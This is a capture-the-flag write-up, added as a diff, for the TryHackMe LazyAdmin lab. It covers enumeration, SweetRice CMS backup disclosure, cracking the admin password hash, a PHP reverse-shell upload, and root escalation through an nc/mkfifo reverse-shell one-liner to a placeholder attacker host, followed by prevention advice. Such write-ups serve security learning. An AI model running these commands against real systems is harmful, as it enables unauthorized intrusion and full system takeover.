@@ -1,0 +1,153 @@
+# LazyAdmin - TryHackMe
+
+## Target Information
+
+* **Target IP:** `10.10.153.54`
+* **Goal:** Get **User Flag** and **Root Flag**
+
+## Steps
+
+### **1. Nmap Scan**
+
+Run Nmap with service detection and default scripts:
+nmap -Pn -sC -sV -oN ./nmap/lazyadmin.nmap 10.10.153.54
+
+**Findings:**
+
+* **Port 22** → OpenSSH 7.2p2 (Ubuntu)
+* **Port 80** → Apache HTTPD 2.4.18 (Ubuntu)
+
+### **2. Enumerate Web Server**
+
+Default Apache page found at:
+http://10.10.153.54
+
+Next → Directory brute-forcing.
+
+### **3. Directory Bruteforce (Gobuster)**
+gobuster dir -u http://10.10.153.54 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+**Results:**
+/content
+/server-status
+
+Then scan `/content`:
+gobuster dir -u http://10.10.153.54/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+### **4. CMS Identified: SweetRice**
+
+Navigate to:
+http://10.10.153.54/content
+
+### **5. Vulnerability Search**
+
+SweetRice CMS 1.5.1 → Vulnerable to **Backup Disclosure** (EDB ID: 40718)
+
+**Exploit Path:**
+http://<IP>/content/inc/mysql_backup/
+
+### **6. Download MySQL Backup**
+
+Found:
+mysql_backup_20191129023059-1.5.1.sql
+
+Download:
+wget http://10.10.153.54/content/inc/mysql_backup/mysql_backup_20191129023059-1.5.1.sql
+
+### **7. Extract Credentials**
+
+View file:
+cat mysql_backup_20191129023059-1.5.1.sql
+
+Found MD5 hash:
+42f749ade7f9e195bf475f37a44cafcb
+
+Crack using CrackStation → **Password123**
+
+### **8. Login to Admin Panel**
+
+URL:
+http://10.10.153.54/content/as
+
+**Credentials:**
+Username: manager
+Password: Password123
+
+### **9. Upload Reverse Shell**
+
+Download PHP reverse shell:
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+Modify:
+$ip = '<YOUR_ATTACKER_IP>';
+$port = 4444;
+
+Rename:
+mv php-reverse-shell.php shell.phtml
+
+Upload via **Media Center** in SweetRice.
+
+### **10. Get Reverse Shell**
+
+Start listener:
+nc -lvnp 4444
+
+Trigger uploaded file:
+http://10.10.153.54/content/attachment/shell.phtml
+
+Upgrade shell:
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+### **11. User Flag**
+
+Navigate:
+cd /home/itguy
+cat user.txt
+
+## Privilege Escalation to Root
+
+### **12. Check Sudo Privileges**
+sudo -l
+
+Output:
+(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+
+### **13. Analyze backup.pl**
+cat /home/itguy/backup.pl
+
+Calls `/etc/copy.sh` → Editable by us.
+
+### **14. Exploit**
+
+Overwrite `/etc/copy.sh`:
+echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 5554 > /tmp/f" > /etc/copy.sh
+
+Start listener:
+nc -lvnp 5554
+
+Execute as root:
+sudo /usr/bin/perl /home/itguy/backup.pl
+
+Root shell obtained.
+
+### **15. Root Flag**
+cd /root
+cat root.txt
+
+## How to Prevent This Attack
+
+* **Patch Software:** Always update CMS and dependencies.
+* **Restrict Backup Access:** Store backups securely, outside public web directories.
+* **Principle of Least Privilege:** Avoid giving unnecessary sudo access.
+* **Secure File Upload:** Validate file types, block executable uploads.
+* **Use Strong Hashing:** Replace MD5 with bcrypt/Argon2 and salt passwords.
+* **Restrict SSH Access:** Limit to trusted IP addresses and enable 2FA.
+* **Regular Vulnerability Scans:** Use Nmap, OpenVAS, Nessus.
+
+## Tools Used
+
+* **Nmap** (Network Scanning)
+* **Gobuster** (Directory Enumeration)
+* **CrackStation** (Password Cracking)
+* **Netcat** (Reverse Shell Listener)
+* **SweetRice CMS Exploit** (Backup Disclosure)
